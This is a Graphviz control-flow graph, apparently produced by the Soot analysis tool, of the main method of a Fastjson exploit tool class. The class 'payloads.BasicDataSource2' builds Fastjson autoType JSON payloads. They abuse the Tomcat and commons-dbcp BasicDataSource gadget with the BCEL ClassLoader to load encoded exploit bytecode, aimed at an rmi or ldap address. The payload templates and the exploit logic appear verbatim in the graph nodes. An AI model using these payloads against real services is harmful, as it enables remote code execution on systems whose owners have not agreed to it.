digraph "unitGraph" {
    "r0 := @parameter0: java.lang.String[]"
    "$i0 = lengthof r0"
    "if $i0 == 1 goto $r1 = r0[0]"
    "$i2 = lengthof r0"
    "if $i2 == 2 goto $r1 = r0[0]"
    "$r12 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r12.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usge: java -cp FastjsonExploit-<version>.jar payloads.BasicDataSource2 <rmi/ldap address>\")"
    "return"
    "$r1 = r0[0]"
    "r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"
    "$r3 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r3.<java.io.PrintStream: void println(java.lang.String)>(r2)"
    "r14 = \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"xxxxxxxxxx\\\"}}:\\\"ddd\\\"}\""
    "r15 = \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.commons.dbcp.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"xxxxxxxxxx\\\"}}:\\\"ddd\\\"}\""
    "r4 = staticinvoke <gadget.Gadget: byte[] getBasicDataSource1ExpCode(java.lang.String)>(r2)"
    "r16 = staticinvoke <com.sun.org.apache.bcel.internal.classfile.Utility: java.lang.String encode(byte[],boolean)>(r4, 1)"
    "$r5 = new java.lang.StringBuilder"
    "specialinvoke $r5.<java.lang.StringBuilder: void <init>()>()"
    "$r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"$$BCEL$$\")"
    "$r7 = virtualinvoke $r6.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r16)"
    "r17 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>()"
    "r18 = virtualinvoke r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"xxxxxxxxxx\", r17)"
    "$r8 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(r18)"
    "$i1 = lengthof r0"
    "if $i1 != 2 goto (branch)"
    "$r9 = r0[1]"
    "$z0 = virtualinvoke $r9.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"
    "if $z0 == 0 goto (branch)"
    "$r10 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")"
    "staticinvoke <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>(r18)"
    "goto [?= return]"
    "$r13 := @caughtexception"
    "r19 = $r13"
    "virtualinvoke r19.<java.lang.Exception: void printStackTrace()>()"
    "r0 := @parameter0: java.lang.String[]"->"$i0 = lengthof r0";
    "$i0 = lengthof r0"->"if $i0 == 1 goto $r1 = r0[0]";
    "if $i0 == 1 goto $r1 = r0[0]"->"$i2 = lengthof r0";
    "if $i0 == 1 goto $r1 = r0[0]"->"$r1 = r0[0]";
    "$i2 = lengthof r0"->"if $i2 == 2 goto $r1 = r0[0]";
    "if $i2 == 2 goto $r1 = r0[0]"->"$r12 = <java.lang.System: java.io.PrintStream out>";
    "if $i2 == 2 goto $r1 = r0[0]"->"$r1 = r0[0]";
    "$r12 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r12.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usge: java -cp FastjsonExploit-<version>.jar payloads.BasicDataSource2 <rmi/ldap address>\")";
    "virtualinvoke $r12.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usge: java -cp FastjsonExploit-<version>.jar payloads.BasicDataSource2 <rmi/ldap address>\")"->"return";
    "$r1 = r0[0]"->"r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()";
    "r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"->"$r3 = <java.lang.System: java.io.PrintStream out>";
    "$r3 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r3.<java.io.PrintStream: void println(java.lang.String)>(r2)";
    "virtualinvoke $r3.<java.io.PrintStream: void println(java.lang.String)>(r2)"->"r14 = \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"xxxxxxxxxx\\\"}}:\\\"ddd\\\"}\"";
    "virtualinvoke $r3.<java.io.PrintStream: void println(java.lang.String)>(r2)"->"$r13 := @caughtexception";
    "r14 = \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"xxxxxxxxxx\\\"}}:\\\"ddd\\\"}\""->"r15 = \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.commons.dbcp.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"xxxxxxxxxx\\\"}}:\\\"ddd\\\"}\"";
    "r14 = \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"xxxxxxxxxx\\\"}}:\\\"ddd\\\"}\""->"$r13 := @caughtexception";
    "r15 = \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.commons.dbcp.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"xxxxxxxxxx\\\"}}:\\\"ddd\\\"}\""->"r4 = staticinvoke <gadget.Gadget: byte[] getBasicDataSource1ExpCode(java.lang.String)>(r2)";
    "r15 = \"{{\\\"@type\\\":\\\"com.alibaba.fastjson.JSONObject\\\",\\\"c\\\":{\\\"@type\\\":\\\"org.apache.commons.dbcp.BasicDataSource\\\",\\\"driverClassLoader\\\":{\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"},\\\"driverClassName\\\":\\\"xxxxxxxxxx\\\"}}:\\\"ddd\\\"}\""->"$r13 := @caughtexception";
    "r4 = staticinvoke <gadget.Gadget: byte[] getBasicDataSource1ExpCode(java.lang.String)>(r2)"->"r16 = staticinvoke <com.sun.org.apache.bcel.internal.classfile.Utility: java.lang.String encode(byte[],boolean)>(r4, 1)";
    "r4 = staticinvoke <gadget.Gadget: byte[] getBasicDataSource1ExpCode(java.lang.String)>(r2)"->"$r13 := @caughtexception";
    "r16 = staticinvoke <com.sun.org.apache.bcel.internal.classfile.Utility: java.lang.String encode(byte[],boolean)>(r4, 1)"->"$r5 = new java.lang.StringBuilder";
    "r16 = staticinvoke <com.sun.org.apache.bcel.internal.classfile.Utility: java.lang.String encode(byte[],boolean)>(r4, 1)"->"$r13 := @caughtexception";
    "$r5 = new java.lang.StringBuilder"->"specialinvoke $r5.<java.lang.StringBuilder: void <init>()>()";
    "$r5 = new java.lang.StringBuilder"->"$r13 := @caughtexception";
    "specialinvoke $r5.<java.lang.StringBuilder: void <init>()>()"->"$r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"$$BCEL$$\")";
    "specialinvoke $r5.<java.lang.StringBuilder: void <init>()>()"->"$r13 := @caughtexception";
    "$r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"$$BCEL$$\")"->"$r7 = virtualinvoke $r6.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r16)";
    "$r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"$$BCEL$$\")"->"$r13 := @caughtexception";
    "$r7 = virtualinvoke $r6.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r16)"->"r17 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>()";
    "$r7 = virtualinvoke $r6.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r16)"->"$r13 := @caughtexception";
    "r17 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>()"->"r18 = virtualinvoke r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"xxxxxxxxxx\", r17)";
    "r17 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>()"->"$r13 := @caughtexception";
    "r18 = virtualinvoke r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"xxxxxxxxxx\", r17)"->"$r8 = <java.lang.System: java.io.PrintStream out>";
    "r18 = virtualinvoke r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"xxxxxxxxxx\", r17)"->"$r13 := @caughtexception";
    "$r8 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(r18)";
    "$r8 = <java.lang.System: java.io.PrintStream out>"->"$r13 := @caughtexception";
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(r18)"->"$i1 = lengthof r0";
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(r18)"->"$r13 := @caughtexception";
    "$i1 = lengthof r0"->"if $i1 != 2 goto (branch)";
    "$i1 = lengthof r0"->"$r13 := @caughtexception";
    "if $i1 != 2 goto (branch)"->"$r9 = r0[1]";
    "if $i1 != 2 goto (branch)"->"goto [?= return]";
    "if $i1 != 2 goto (branch)"->"$r13 := @caughtexception";
    "$r9 = r0[1]"->"$z0 = virtualinvoke $r9.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")";
    "$r9 = r0[1]"->"$r13 := @caughtexception";
    "$z0 = virtualinvoke $r9.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"->"if $z0 == 0 goto (branch)";
    "$z0 = virtualinvoke $r9.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"->"$r13 := @caughtexception";
    "if $z0 == 0 goto (branch)"->"$r10 = <java.lang.System: java.io.PrintStream out>";
    "if $z0 == 0 goto (branch)"->"goto [?= return]";
    "if $z0 == 0 goto (branch)"->"$r13 := @caughtexception";
    "$r10 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")";
    "$r10 = <java.lang.System: java.io.PrintStream out>"->"$r13 := @caughtexception";
    "virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")"->"staticinvoke <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>(r18)";
    "virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")"->"$r13 := @caughtexception";
    "staticinvoke <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>(r18)"->"goto [?= return]";
    "staticinvoke <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>(r18)"->"$r13 := @caughtexception";
    "goto [?= return]"->"return";
    "$r13 := @caughtexception"->"r19 = $r13";
    "r19 = $r13"->"virtualinvoke r19.<java.lang.Exception: void printStackTrace()>()";
    "virtualinvoke r19.<java.lang.Exception: void printStackTrace()>()"->"return";
}
